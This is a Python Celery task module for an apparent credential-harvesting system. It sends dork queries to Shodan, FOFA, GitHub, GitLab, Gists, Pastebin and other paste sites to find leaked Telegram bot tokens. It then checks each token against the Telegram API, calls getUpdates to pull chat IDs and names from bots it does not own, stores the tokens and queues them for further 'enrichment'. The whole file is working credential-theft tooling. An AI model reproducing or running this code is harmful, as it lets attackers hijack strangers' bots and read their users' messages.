from app.workers.celery_app import app
from app.workers.tasks.flow_tasks import enrich_credential, async_execute # Import for triggering and DB
import asyncio # Ensure asyncio is imported
import random
from app.core.config import settings
from app.services.scanners import ShodanService, GithubService, UrlScanService, FofaService
from app.services.scanners import GitlabService, BitbucketService, GithubGistService, GrepAppService, PublicWwwService, PastebinService, SerperService

from app.core.security import security
from app.core.database import db
import hashlib
import logging
import time

# Configure Task Logger
logger = logging.getLogger("scanner.tasks")
logger.setLevel(logging.INFO)

# Instantiate services
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()
fofa = FofaService()

gitlab_srv = GitlabService()
bitbucket_srv = BitbucketService()
gist_srv = GithubGistService()
grepapp_srv = GrepAppService()
publicwww_srv = PublicWwwService()
pastebin_srv = PastebinService()
serper_srv = SerperService()


def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def _save_credentials_async(results, source_name: str):
    """
    Validates token format and checks if bot is active via Telegram Bot API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import httpx
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    logger.info(f"🔍 [Batch] Validating {len(results)} potential credentials from {source_name}...")
    
    # Use Async Client for validation
    async with httpx.AsyncClient(timeout=10.0) as client:
        
        for item in results:
            token = item.get("token")
            if not token or token == "MANUAL_REVIEW_REQUIRED":
                continue
            
            # Step 1: Validate token format (reject Fernet/hashes)
            if not _is_valid_token(token):
                logger.debug(f"    ❌ [Validate] Invalid format: {token[:15]}...")
                continue
            
            token_hash = _calculate_hash(token)
            existing_id = None
            existing_has_chat = False
            
            # Check if the result already has a chat_id (From URL/DeepScan extraction)
            extracted_chat_id = item.get("chat_id")
            
            try:
                # Step 2: Check if already exists (Using async_execute)
                existing = await async_execute(db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash))
                if existing.data:
                    existing_id = existing.data[0]['id']
                    existing_has_chat = existing.data[0].get('chat_id') is not None
                    if existing_has_chat:
                        logger.debug(f"    ⏭️ [Validate] Token {token[:10]}... already exists with chat_id.")
                        continue  # Skip - already has chat_id
                    logger.info(f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates...")
                
                # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
                # Adding localized retry for Telegram API flakes
                base_url = f"https://api.telegram.org/bot{token}"
                me_data = None
                me_res = None
                
                for attempt in range(2):
                    try:
                        me_res = await client.get(f"{base_url}/getMe")
                        me_data = me_res.json()
                        if me_res.status_code == 200 and me_data.get('ok'):
                            break
                    except Exception:
                        if attempt == 0: await asyncio.sleep(1)
                        continue
                
                if not me_res or me_res.status_code != 200 or not me_data.get('ok'):
                    logger.debug(f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code if me_res else 'timeout'})")
                    continue
                
                bot_info = me_data.get('result', {})
                bot_username = bot_info.get('username', 'unknown')
                logger.info(f"    ✅ [Validate] Token VALID! Bot: @{bot_username} (ID: {bot_info.get('id')})")
                
                # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
                chat_id = extracted_chat_id
                chat_name = None
                chat_type = None

                if chat_id:
                    logger.info(f"    📍 [Validate] Using extracted chat_id: {chat_id}")
                else:
                    # Try to fetch via API if we didn't extract one
                    try:
                        updates_res = await client.get(f"{base_url}/getUpdates", params={'limit': 10})
                        if updates_res.status_code == 200 and updates_res.json().get('ok'):
                            updates = updates_res.json().get('result', [])
                            for update in updates:
                                for key in ['message', 'channel_post', 'my_chat_member']:
                                    if key in update and update[key].get('chat'):
                                        chat = update[key]['chat']
                                        chat_id = chat.get('id')
                                        chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
                                        chat_type = chat.get('type')
                                        break
                                if chat_id:
                                    logger.info(f"    🕵️ [Validate] Discovered chat_id via getUpdates: {chat_name} ({chat_id})")
                                    break
                    except Exception as e:
                        logger.warning(f"    ⚠️ [Validate] getUpdates check failed: {e}")
                
                # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
                
                if existing_id and chat_id:
                    # UPDATE existing record with new chat_id
                    update_data = {
                        "chat_id": chat_id,
                        "status": "active",
                        "meta": {
                            **item.get("meta", {}),
                            **existing.data[0].get("meta", {}),
                            "last_seen_source": source_name,
                            "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S")
                        }
                    }
                    if chat_name: update_data["chat_name"] = chat_name
                    if chat_type: update_data["chat_type"] = chat_type
                    
                    await async_execute(db.table("discovered_credentials").update(update_data).eq("id", existing_id))
                    logger.info(f"    🆙 [Batch] Updated existing record {existing_id} with chat_id {chat_id}")
                    saved_count += 1
                
                elif existing_id and not chat_id:
                    # Token exists but still no chat_id found in this scan
                    # Trigger enrichment anyway to try recursive discovery
                    enrich_credential.delay(existing_id)
                    pass
                elif not existing_id:
                    # INSERT new record
                    new_data = {
                        "token": security.encrypt(token),
                        "token_hash": token_hash,
                        "chat_id": chat_id,
                        "chat_name": chat_name,
                        "chat_type": chat_type,
                        "bot_id": str(bot_info.get('id')),
                        "bot_username": bot_username,
                        "source": source_name,
                        "status": "pending" if not chat_id else "active",
                        "meta": {
                            **item.get("meta", {}),
                            "bot_username": bot_username,
                            "bot_id": bot_info.get('id'),
                            "chat_name": chat_name,
                            "chat_type": chat_type
                        }
                    }
                    
                    res = await async_execute(db.table("discovered_credentials").insert(new_data))
                    
                    if res.data:
                        new_id = res.data[0]['id']
                        status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
                        
                        from app.services.broadcaster_srv import BroadcasterService
                        broadcaster = BroadcasterService()
                        await broadcaster.send_log(
                            f"🎯 [{source_name}] **New Bot Token!**\n"
                            f"Bot: @{bot_username}\n"
                            f"ID: `{new_id}`\n"
                            f"Status: {status_label}"
                        )
                        saved_count += 1
                        
                        # TRIGGER ENRICHMENT for new credentials
                        enrich_credential.delay(new_id)
                    
            except Exception as e:
                logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
                pass
    
    logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
    return saved_count

def _run_sync(coro):
    """Helper to run async code in sync Celery task"""
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
    return loop.run_until_complete(coro)

def _save_credentials(results, source_name: str):
    return _run_sync(_save_credentials_async(results, source_name))

async def _send_log_async(message: str):
    from app.services.broadcaster_srv import BroadcasterService
    broadcaster = BroadcasterService()
    await broadcaster.send_log(message)

# ==========================================
# TASKS
# ==========================================

@app.task(name="scanner.scan_shodan")
def scan_shodan(query: str = None, country_code: str = None):
    return _run_sync(_scan_shodan_async(query, country_code))

async def _scan_shodan_async(query: str = None, country_code: str = None):
    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org"
    ]
    
    default_queries = [f'http.html:"{q}"' for q in COMMON_QUERIES]
    default_queries.extend([
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ])
    
    queries = [query] if query else default_queries

    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)

    logger.info(f"🌎 [Shodan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    
    # Check Pause State
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Shodan] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(f"🌎 [Shodan] Starting scan with {len(queries)} queries (Country: {selected_country})...")
    
    total_saved = 0
    errors = []

    for q in queries:
        try:
            logger.info(f"    🔎 [Shodan] Executing query: {q}")
            # AWAIT the async search
            results = await shodan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [Shodan] Query returned {len(results)} raw results.")
            
            # AWAIT the async save
            saved = await _save_credentials_async(results, "shodan")
            total_saved += saved
            
            await asyncio.sleep(1) # Rate limit respect
        except Exception as e:
            logger.error(f"    ❌ [Shodan] Query failed: {str(e)}")
            errors.append(str(e))
            
    result_msg = f"Shodan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [Shodan] Completed with errors: {errors[0]}...")

    logger.info(f"🏁 [Shodan] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    await _send_log_async(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_urlscan")
def scan_urlscan(query: str = None, country_code: str = None):
    return _run_sync(_scan_urlscan_async(query, country_code))

async def _scan_urlscan_async(query: str = None, country_code: str = None):
    import time
    
    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org"
    ]
    
    queries = [query] if query else COMMON_QUERIES
    
    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        
    logger.info(f"🔍 [URLScan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    
    # Check Pause State
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [URLScan] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(f"🔍 [URLScan] Starting scan with {len(queries)} queries (Country: {selected_country})")
    
    total_saved = 0
    errors = []
    
    for q in queries:
        try:
            logger.info(f"    🔎 [URLScan] Query: {q}")
            results = await urlscan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [URLScan] Returned {len(results)} results.")
            
            saved = await _save_credentials_async(results, "urlscan")
            total_saved += saved
            await asyncio.sleep(2)  # Rate limit protection
        except Exception as e:
            logger.error(f"    ❌ [URLScan] Query failed: {e}")
            errors.append(str(e))
    
    result_msg = f"URLScan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        
    logger.info(f"🏁 [URLScan] Finished | Saved: {total_saved} | Errors: {len(errors)}")
    await _send_log_async(f"🏁 [URLScan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    return _run_sync(_scan_github_async(query))

async def _scan_github_async(query: str = None):
    import random
    default_dorks = [
        "filename:.env \"TELEGRAM_BOT_TOKEN\"",
        "filename:.env \"TG_BOT_TOKEN\"", 
        "filename:.env \"api.telegram.org\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
        "filename:config.yaml \"telegram_token\"",
        "filename:config.toml \"telegram_token\"",
        "filename:docker-compose.yml \"TELEGRAM_BOT_TOKEN\"",
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:javascript \"new TelegramBot\" \"token\"",
        "language:php \"TelegramBot\" \"api_key\"",
        "language:go \"NewBotAPI\"",
        "\"https://api.telegram.org/bot\" -filename:README.md -filename:dataset", 
        "\"123456789:\" NOT 123456789", 
        "\"TELEGRAM_KEY\"",
        "\"BOT_TOKEN\""
    ]
    
    if query:
        queries = [query]
    else:
        queries = default_dorks
        
    total_saved = 0
    errors = []

    # Check Pause State
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GitHub] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
    await _send_log_async(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (Full sweep)...")

    for q in queries:
        logger.info(f"    🔎 [GitHub] Dorking: {q}")
        try:
            results = await github.search(q)
            logger.info(f"    ✅ [GitHub] Dork returned {len(results)} matches.")
            
            saved = await _save_credentials_async(results, "github")
            total_saved += saved
            
        except Exception as e:
            logger.error(f"    ❌ [GitHub] Dork failed: {str(e)}")
            errors.append(str(e))
        
        await asyncio.sleep(5) 
            
    if errors:
         logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.") 

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    await _send_log_async(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg

@app.task(name="scanner.scan_fofa", bind=True, autoretry_for=(Exception,), retry_backoff=True, retry_jitter=True, max_retries=3)
def scan_fofa(self, query: str = None, country_code: str = None):
    return _run_sync(_scan_fofa_async(self, query, country_code))

async def _scan_fofa_async(task_self, query: str = None, country_code: str = None):
    COMMON_QUERIES = [
        'body="api.telegram.org/bot"',
        'body="bot_token"',
        'body="TELEGRAM_BOT_TOKEN"',
        'title="Telegram Bot"',
        'body="sendMessage" && body="chat_id"',
    ]
    
    queries = [query] if query else COMMON_QUERIES
    
    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        logger.info(f"    [FOFA] Randomly selected country: {selected_country}")
    
    logger.info(f"🔍 [FOFA] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    
    # Check Pause State
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [FOFA] System is PAUSED. Skipping scan.")
        return "System Paused"

    await _send_log_async(f"🔍 [FOFA] Starting scan with {len(queries)} queries (Country: {selected_country})...")
    
    total_saved = 0
    errors = []
    
    for q in queries:
        try:
            logger.info(f"    🔎 [FOFA] Executing query: {q}")
            results = await fofa.search(query=q, country_code=selected_country)
            logger.info(f"    ✅ [FOFA] Query returned {len(results)} raw results.")
            
            saved = await _save_credentials_async(results, "fofa")
            total_saved += saved
            await asyncio.sleep(2)
        except Exception as e:
            logger.error(f"    ❌ [FOFA] Query failed: {str(e)}")
            errors.append(str(e))
            if task_self.request.retries < task_self.max_retries:
                 # We can't use self.retry inside async without care? 
                 # Celery retry raises an exception.
                 # Just log for now to avoid complexity in this async wrapper
                 pass
    
    result_msg = f"FOFA scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        await _send_log_async(f"❌ [FOFA] Completed with errors: {errors[0]}...")
    else:
        await _send_log_async(f"🏁 [FOFA] Finished. Saved {total_saved} new credentials.")
    
    logger.info(f"🏁 [FOFA] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    return result_msg

@app.task(name="scanner.scan_gitlab", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_gitlab(query: str = None):
    return _run_sync(_scan_gitlab_async(query))

async def _scan_gitlab_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GitLab] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [GitLab] Starting scan...")
    await _send_log_async("🔍 [GitLab] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await gitlab_srv.search()
        logger.info(f"    ✅ [GitLab] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "gitlab")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [GitLab] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"GitLab scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [GitLab] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [GitLab] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_bitbucket", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_bitbucket(query: str = None):
    return _run_sync(_scan_bitbucket_async(query))

async def _scan_bitbucket_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Bitbucket] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Bitbucket] Starting scan...")
    await _send_log_async("🔍 [Bitbucket] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await bitbucket_srv.search()
        logger.info(f"    ✅ [Bitbucket] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "bitbucket")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Bitbucket] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"Bitbucket scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [Bitbucket] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [Bitbucket] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_gist", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_gist(query: str = None):
    return _run_sync(_scan_gist_async(query))

async def _scan_gist_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Gist] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Gist] Starting scan...")
    await _send_log_async("🔍 [Gist] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await gist_srv.search()
        logger.info(f"    ✅ [Gist] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "gist")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Gist] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"Gist scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [Gist] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [Gist] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_grepapp", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_grepapp(query: str = None):
    return _run_sync(_scan_grepapp_async(query))

async def _scan_grepapp_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [GrepApp] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [GrepApp] Starting scan...")
    await _send_log_async("🔍 [GrepApp] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await grepapp_srv.search()
        logger.info(f"    ✅ [GrepApp] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "grepapp")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [GrepApp] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"GrepApp scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [GrepApp] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [GrepApp] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_publicwww", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_publicwww(query: str = None):
    return _run_sync(_scan_publicwww_async(query))

async def _scan_publicwww_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [PublicWWW] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [PublicWWW] Starting scan...")
    await _send_log_async("🔍 [PublicWWW] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await publicwww_srv.search()
        logger.info(f"    ✅ [PublicWWW] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "publicwww")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [PublicWWW] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"PublicWWW scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [PublicWWW] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [PublicWWW] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_pastebin", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_pastebin(query: str = None):
    return _run_sync(_scan_pastebin_async(query))

async def _scan_pastebin_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
        logger.warning("⏸️ [Pastebin] System is PAUSED. Skipping scan.")
        return "System Paused"

    logger.info("🔍 [Pastebin] Starting scan...")
    await _send_log_async("🔍 [Pastebin] Starting scheduled scan...")
    
    total_saved = 0
    errors = []
    
    try:
        results = await pastebin_srv.search()
        logger.info(f"    ✅ [Pastebin] Returned {len(results)} matches.")
        saved = await _save_credentials_async(results, "pastebin")
        total_saved += saved
    except Exception as e:
        logger.error(f"    ❌ [Pastebin] Scan failed: {str(e)}")
        errors.append(str(e))
        
    result_msg = f"Pastebin scan finished. Saved {total_saved} new credentials."
    if errors:
         result_msg += f" (Errors: {len(errors)})"
         await _send_log_async(f"❌ [Pastebin] Completed with errors: {errors[0]}...")
    else:
         await _send_log_async(f"🏁 [Pastebin] Finished. Saved {total_saved} new credentials.")
         
    return result_msg

@app.task(name="scanner.scan_serper", autoretry_for=(Exception,), retry_backoff=True, max_retries=3)
def scan_serper(query: str = None):
    return _run_sync(_scan_serper_async(query))

async def _scan_serper_async(query: str = None):
    import redis
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
    if redis_client.get("system:paused"):
         return "System Paused"

    # Default clones to sweep
    dorks = [
        'site:pastebin.com "api.telegram.org/bot"',
        'site:hastebin.com "api.telegram.org/bot"',
        'site:ghostbin.com "api.telegram.org/bot"',
        'site:rentry.co "api.telegram.org/bot"',
    ]
    if query:
        dorks = [query]

    logger.info(f"🔍 [Serper] Starting scan with {len(dorks)} dorks...")
    await _send_log_async(f"🔍 [Serper] Starting sweep across {len(dorks)} paste sites via Serper.dev...")
    
    total_saved = 0
    for dork in dorks:
        try:
            results = await serper_srv.search(dork)
            saved = await _save_credentials_async(results, "serper_dev")
            total_saved += saved
        except Exception as e:
            logger.error(f"    ❌ [Serper] Failed on {dork}: {e}")
            
    await _send_log_async(f"🏁 [Serper] Finished. Saved {total_saved} new credentials.")
    return f"Serper scan finished. Saved {total_saved}."
